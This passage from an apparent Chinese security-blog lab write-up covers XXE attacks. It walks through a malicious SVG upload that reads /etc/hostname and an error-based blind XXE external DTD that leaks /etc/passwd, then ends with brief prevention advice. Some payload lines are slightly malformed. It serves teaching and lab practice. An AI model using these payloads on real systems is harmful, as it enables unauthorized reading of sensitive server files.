通过文件上传的 XXE 攻击"></a>④ 通过文件上传的 XXE 攻击</h6><p>有些应用程序允许用户上传文件，然后在服务器端处理这些文件。一些常见的文件格式使用<strong>XML</strong>或包含XML子组件。基于<strong>xml</strong>的格式的例子有<strong>DOCX</strong>这样的办公文档格式和<strong>SVG</strong>这样的图像格式。</p><p>例如，应用程序可能允许用户上传图像，并在上传后在服务器上处理或验证这些图像。即使应用程序希望接收<strong>PNG</strong>或<strong>JPEG</strong>这样的格式，所使用的图像处理库也可能支持<strong>SVG</strong>图像。由于<strong>SVG</strong>格式使用<strong>XML</strong>，攻击者可以提交恶意<strong>SVG</strong>图像，从而达到针对<strong>XXE</strong>漏洞的隐藏攻击面。</p><p>该实验环境需要创建<strong>svg</strong>文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p>然后上传此svg图像，</p><p><img src="/image/XXE/7.png" alt="7"></p><p>然后在查看评论时会在头像中看到<code>/etc/hostname</code>的内容</p><p><img src="/image/XXE/8.png" alt="8"></p><h6 id="⑤-无回显-XXE-通过错误消息检索数据"><a href="#⑤-无回显-XXE-通过错误消息检索数据" class="headerlink" title="⑤ 无回显 XXE 通过错误消息检索数据"></a>⑤ 无回显 XXE 通过错误消息检索数据</h6><p>利用无回显的一种方法是触发一个<strong>XML</strong>解析错误,其中错误消息包含检索的敏感数据。如果应用程序在其响应中返回错误消息，这将是有效的。</p><p>可以使用恶意的外部<strong>DTD</strong>触发包含**/etc/passwd**文件内容的XML解析错误消息，如下所示:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure><p>该<strong>DTD</strong>的执行步骤为：</p><ul><li>定义一个称为<strong>file</strong>的<strong>XML</strong>参数实体，包含 /etc/passwd 文件的内容。</li></ul><ul><li>定义一个名为<strong>eval</strong>的<strong>XML</strong>参数实体，其中包含名为<strong>error</strong>的另一个<strong>XML</strong>参数实体的动态声明。通过加载一个名称包含文件实体值的不存在的文件来评估错误实体。</li></ul><ul><li>使用<strong>eval</strong>实体，它会执行错误实体的动态声明。</li></ul><ul><li>使用<strong>error</strong>实体，以便通过尝试加载不存在的文件来评估它的值，从而导致包含不存在文件的名称(即 /etc/passwd 文件的内容)的错误消息。</li></ul><p>在此次实验中，需要用到的<strong>DTD</strong>为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;file:///invalid/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfil;</span><br><span class="line">/etc/passwdfile</span><br></pre></td></tr></table></figure><p>首先在实验室环境中的<code>Go to exploit server</code>处上传<strong>DTD</strong>生成一个恶意的<strong>URL</strong></p><p>然后在<code>check stock</code>功能处插入外部实体即可完成<strong>XXE</strong>攻击。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;YOUR-DTD-URL&quot;&gt; %xxe;]&gt;`</span><br><span class="line">`/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/image/XXE/9.png" alt="9"></p><h4 id="0x04-XXE-攻击预防"><a href="#0x04-XXE-攻击预防" class="headerlink" title="0x04 XXE 攻击预防"></a>0x04 XXE 攻击预防</h4><p>几乎所有<strong>XXE</strong>漏洞的出现都是因为应用程序的<strong>XML</strong>解析库支持应用程序不需要或不打算使用的潜在危险的<strong>XML</strong>特性。防止<strong>XXE</strong>攻击的最简单和最有效的方法是禁用这些特性。通常，只要禁用外部实体的解析和禁用对<strong>XInclude</strong>的支持就足够了。可以通过配置选项或通过编程覆盖默认行为来实现。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-XML-攻击原理&quot;&gt;&lt;a href=&quot;#0x01-XML-攻击原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 XML 攻击原理&quot;&gt;&lt;/a&gt;0x01 XML 攻击原理&lt;/h4&gt;&lt;h6 id=&quot;①-XML介绍：&quot;&gt;&lt;a href=&quot;#①</summary>
      
    
    
    
    <category term="Web" scheme="https://banana69.site/categories/Web/"/>
    
    
    <category term="XXE" scheme="https://banana69.site/tags/XXE/"/>
    
  </entry>
  
</feed>
